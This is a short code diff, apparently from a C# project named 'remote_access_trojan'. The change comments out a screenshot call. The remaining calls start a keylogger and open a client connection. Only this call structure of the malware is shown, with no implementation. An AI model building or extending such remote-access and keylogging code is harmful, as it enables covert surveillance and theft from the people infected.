@@ -18,7 +18,7 @@ namespace remote_access_trojan
 
 
             Keylogger.Run();
-            Screenshot.takeScreenshot();
+            // insert parameter -> Screenshot.takeScreenshot();
            // Client.ZipFiles();
             Client.newClient();
 
